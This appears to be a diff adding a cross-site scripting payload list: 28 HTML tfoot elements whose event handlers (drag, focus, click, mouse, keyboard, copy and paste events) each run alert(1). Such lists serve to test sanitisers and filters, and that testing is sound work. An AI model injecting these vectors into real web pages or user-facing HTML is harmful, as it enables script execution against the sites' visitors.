@@ -1,0 +1,28 @@
+<tfoot draggable="true" ondrag="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragend="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragenter="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragleave="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragstart="alert(1)">test</tfoot>
+<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
+<tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
+<tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
+<tfoot onbeforepaste="alert(1)" contenteditable>test</tfoot>
+<tfoot onclick="alert(1)">test</tfoot>
+<tfoot oncontextmenu="alert(1)">test</tfoot>
+<tfoot oncopy="alert(1)" contenteditable>test</tfoot>
+<tfoot oncut="alert(1)" contenteditable>test</tfoot>
+<tfoot ondblclick="alert(1)">test</tfoot>
+<tfoot onkeydown="alert(1)" contenteditable>test</tfoot>
+<tfoot onkeypress="alert(1)" contenteditable>test</tfoot>
+<tfoot onkeyup="alert(1)" contenteditable>test</tfoot>
+<tfoot onmousedown="alert(1)">test</tfoot>
+<tfoot onmouseenter="alert(1)">test</tfoot>
+<tfoot onmouseleave="alert(1)">test</tfoot>
+<tfoot onmousemove="alert(1)">test</tfoot>
+<tfoot onmouseout="alert(1)">test</tfoot>
+<tfoot onmouseover="alert(1)">test</tfoot>
+<tfoot onmouseup="alert(1)">test</tfoot>
+<tfoot onpaste="alert(1)" contenteditable>test</tfoot>
